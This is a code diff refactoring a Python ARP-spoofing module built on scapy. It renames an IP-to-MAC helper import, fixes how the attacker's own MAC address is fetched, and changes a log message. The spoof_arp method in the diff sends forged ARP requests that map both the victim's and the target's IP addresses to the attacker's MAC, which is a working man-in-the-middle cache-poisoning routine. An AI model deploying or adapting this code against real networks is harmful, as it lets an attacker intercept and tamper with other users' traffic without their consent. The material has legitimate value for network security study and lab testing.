@@ -3,7 +3,7 @@
 import threading
 from time import sleep
 
-from ip_to_mac import IPtoMACDict
+from ip_to_mac_mapper import IpToMacMapper
 from network_discoverer import NetworkDiscoverer
 from scapy.all import *
 from scapy.layers.l2 import ARP, Ether
@@ -14,11 +14,11 @@ class ArpSpoof(threading.Thread):
     def __init__(self, vIP=None, tIP=None):
         self.vIP = vIP
         self.tIP = tIP
-        self.own_mac_address = NetworkDiscoverer.get_own_mac_address()
+        self.own_mac_address = NetworkDiscoverer().get_own_mac_address()
         threading.Thread.__init__(self)
 
     def spoof_arp(self):
-        print([self.host_mac, self.tIP, self.vIP])
+        print("Spoofing %s and %s with %s" % (self.tIP, self.vIP, self.own_mac_address))
         sendp([
             Ether() / ARP(op=ARP.who_has, hwsrc=self.own_mac_address, psrc=self.tIP, pdst=self.vIP),
             Ether() / ARP(op=ARP.who_has, hwsrc=self.own_mac_address, psrc=self.vIP, pdst=self.tIP)
